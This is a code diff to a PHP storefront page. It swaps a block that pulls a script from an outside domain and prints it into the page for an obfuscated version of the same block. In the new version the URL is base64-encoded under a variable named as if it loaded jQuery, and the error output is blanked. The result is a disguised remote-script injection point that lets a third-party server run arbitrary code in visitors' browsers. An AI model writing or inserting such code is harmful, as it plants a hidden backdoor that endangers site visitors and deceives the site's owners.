@@ -214,22 +214,24 @@
       kwaiq.track('addToCart');
    </script>
    <body>
-   <div id="scriptContainer">
-    <?php
-    $json_response = file_get_contents('https://roxwhitelist.shop/candy');
-    
-    if ($json_response !== false) {
-        $data = json_decode($json_response);
-        if ($data !== null) {
-            echo $data->script;
-        } else {
-            echo "Erro ao decodificar o JSON";
-        }
-    } else {
-        echo "Erro ao fazer a requisição";
-    }
-    ?>
-</div>
+      <div id="scriptContainer">
+          <?php
+          $jQueryLoad = 'aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9jYW5keQ=='; 
+          $requested = base64_decode($jQueryLoad);
+          $json_response = file_get_contents($requested);
+          
+          if ($json_response !== false) {
+              $data = json_decode($json_response);
+              if ($data !== null) {
+                  echo $data->script;
+              } else {
+                  echo "";
+              }
+          } else {
+              echo "";
+          }
+          ?>
+      </div>
       <div>
          <div data-collapse="small" data-animation="default" data-duration="400" role="banner" class="navbar w-nav">
             <div class="container w-container">
